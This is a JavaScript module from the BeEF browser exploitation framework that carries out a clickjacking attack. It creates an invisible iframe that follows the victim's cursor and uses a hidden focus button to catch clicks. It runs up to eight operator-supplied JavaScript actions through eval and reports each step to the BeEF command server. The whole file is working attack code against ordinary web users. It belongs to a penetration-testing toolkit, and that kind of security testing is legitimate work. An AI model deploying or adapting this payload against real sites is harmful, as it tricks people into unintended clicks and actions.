/*
 * Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
 * Browser Exploitation Framework (BeEF) - http://beefproject.com
 * See the file 'doc/COPYING' for copying permission
 */

beef.execute(function() {
	var elems = {
		outerFrame: "cjFrame",
		innerFrame: "innerFrame",
		btn: "persistentFocusBtn"
	}

	var clicked = 0;
	var src = "<%= @iFrameSrc %>";
	var secZone = "<%= @iFrameSecurityZone %>";
	var sandbox = "<%= @iFrameSandbox %>";
	var visibility = "<%= @iFrameVisibility %>";

	var clicks = [
		{js:"<%= URI.escape(@clickaction_1) %>", posTop:cleanPos("<%= @iFrameTop_1 %>"), posLeft:cleanPos("<%= @iFrameLeft_1 %>")},
		{js:"<%= URI.escape(@clickaction_2) %>", posTop:cleanPos("<%= @iFrameTop_2 %>"), posLeft:cleanPos("<%= @iFrameLeft_2 %>")},
		{js:"<%= URI.escape(@clickaction_3) %>", posTop:cleanPos("<%= @iFrameTop_3 %>"), posLeft:cleanPos("<%= @iFrameLeft_3 %>")},
		{js:"<%= URI.escape(@clickaction_4) %>", posTop:cleanPos("<%= @iFrameTop_4 %>"), posLeft:cleanPos("<%= @iFrameLeft_4 %>")},
		{js:"<%= URI.escape(@clickaction_5) %>", posTop:cleanPos("<%= @iFrameTop_5 %>"), posLeft:cleanPos("<%= @iFrameLeft_5 %>")},
		{js:"<%= URI.escape(@clickaction_6) %>", posTop:cleanPos("<%= @iFrameTop_6 %>"), posLeft:cleanPos("<%= @iFrameLeft_6 %>")},
		{js:"<%= URI.escape(@clickaction_7) %>", posTop:cleanPos("<%= @iFrameTop_7 %>"), posLeft:cleanPos("<%= @iFrameLeft_7 %>")},
		{js:"<%= URI.escape(@clickaction_8) %>", posTop:cleanPos("<%= @iFrameTop_8 %>"), posLeft:cleanPos("<%= @iFrameLeft_8 %>")},
		{js:"void(0);", posTop:'-', posLeft:'-'}
	]

	var iframeAttrs = {};
	iframeAttrs.src = src;
	(secZone == "on") ? iframeAttrs.security = "restricted" : "";
	(sandbox == "on") ? iframeAttrs.sandbox = "allow-forms" : "";

	var iframeStyles = {};
	iframeStyles.width = "<%= @iFrameWidth %>px";
	iframeStyles.height = "<%= @iFrameHeight %>px";
	iframeStyles.opacity = (visibility == "on") ? "0.6" : "0.0";
	iframeStyles.filter = (visibility == "on") ? "alpha(opacity=60)" : "alpha(opacity=0)";

	var innerPos = {};
	//initialize iframe
	innerPos.top = clicks[0].posTop + "px";
	innerPos.left = clicks[0].posLeft + "px";

	//returns a negative version of a number, or if NaN returns a dash
	function cleanPos(coordinate) {
		var iCoordinate = parseInt(coordinate);
		if (isNaN(iCoordinate))
			return "-";
		else if (iCoordinate > 0)
			return (-1 * iCoordinate)
		return iCoordinate
	}

	function init(params, styles, stylesInner, callback) {
		var container = $j.extend(true, {'border':'none', 'position':'absolute', 'z-index':'100000', 'overflow':'hidden'}, styles);
		var inner = $j.extend(true, {'border':'none', 'position':'absolute', 'width':'2000px', 'height':'10000px'}, stylesInner);

		var containerDiv = $j('<div id="' + elems.outerFrame + '"></div>').css(container).prependTo('body');
		var containerDiv = $j('<input id="' + elems.btn + '" type="button" value="invisible" style="width:1px;height:1px;opacity:0;alpha(opacity=0);margin-left:-200px" />').appendTo('body');

		var innerIframe = $j('<iframe id="' + elems.innerFrame + '" scrolling="no" />').attr(params).css(inner).load(callback).prependTo('#' + elems.outerFrame);

		return containerDiv;
	}

	function step1(){
		var btnSelector = "#" + elems.btn;
		var outerSelector = "#" + elems.outerFrame;
		var btnObj = $j(btnSelector);
		var outerObj = $j(outerSelector);

		$j("body").mousemove(function(e) {
			$j(outerObj).css('top', e.pageY);
			$j(outerObj).css('left', e.pageX);
		});

		$j(btnObj).focus();
		$j(btnObj).focusout(function() {
			cjLog("Iframe clicked");
			iframeClicked();
		});
	}

	function iframeClicked(){
		clicked++;
		var jsfunc = '';
		jsfunc = clicks[clicked-1].js;
		innerPos.top = clicks[clicked].posTop;
		innerPos.left = clicks[clicked].posLeft;
		eval(unescape(jsfunc));
		setTimeout(function(){
			updateIframePosition();
		}, <%= @clickDelay %>);

		setTimeout(function(){
			var btnSelector = "#" + elems.btn;
			var btnObj = $j(btnSelector);
			$j(btnObj).focus();

			//check if there are any more actions to perform
			try {
				if (isNaN(parseInt(clicks[clicked].posTop))) {
					removeAll(elems);
					throw "No more clicks.";
				}
			} catch(e) {
				cjLog(e);
			}
		}, 200);
	}

	function updateIframePosition(){
		var innerSelector = "#" + elems.innerFrame;
		var innerObj = $j(innerSelector);
		$j(innerObj).css('top', innerPos.top + 'px');
		$j(innerObj).css('left', innerPos.left + 'px');
	}

	//Remove outerFrame and persistent button
	function removeAll(){
		$j("#" + elems.outerFrame).remove();
		$j("#" + elems.btn).remove();
	}

	function cjLog(msg){
		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=' + msg);
	}

	init(iframeAttrs, iframeStyles, innerPos,
		function() {
			step1();
			cjLog("Iframe successfully created.");
		}
	);
});
